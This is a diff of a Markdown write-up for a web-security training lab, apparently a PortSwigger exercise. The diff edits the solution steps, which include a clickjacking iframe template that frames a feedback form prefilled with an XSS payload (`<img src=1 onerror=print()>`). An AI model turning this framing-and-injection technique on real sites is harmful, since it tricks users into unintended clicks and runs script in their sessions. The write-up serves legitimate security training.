@@ -10,8 +10,7 @@
 This lab demonstrates combining **Clickjacking with stored XSS** by framing the feedback form with a prepopulated XSS payload, tricking the victim into clicking “Click me” while actually triggering `print()` via the XSS when the victim clicks.
 
 ## 🛠 Steps to Solve
-1. Log in to the given account.
-2. Inject the **XSS** modified payload on the **Exploit** server:
+1. Inject the **XSS** modified payload on the **Exploit** server:
    ```sh
    <style>
 	iframe {
@@ -32,8 +31,8 @@ This lab demonstrates combining **Clickjacking with stored XSS** by framing the 
    <iframe
    src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attackerwebsite.com&subject=test&message=test#feedbackResult"></iframe>
    ```
-3. Adjust the values of the template to align the `Click me` button with the `Submit feedback` button.
-4. Deliver exploit to the victim to complete the lab.
+2. Adjust the values of the template to align the `Click me` button with the `Submit feedback` button.
+3. Deliver exploit to the victim to complete the lab.
    
 ## 📖 Key Takeaways
 - Uses a **prepopulated URL with an XSS payload** (`<img src=1 onerror=print()>`) to execute JavaScript on click.
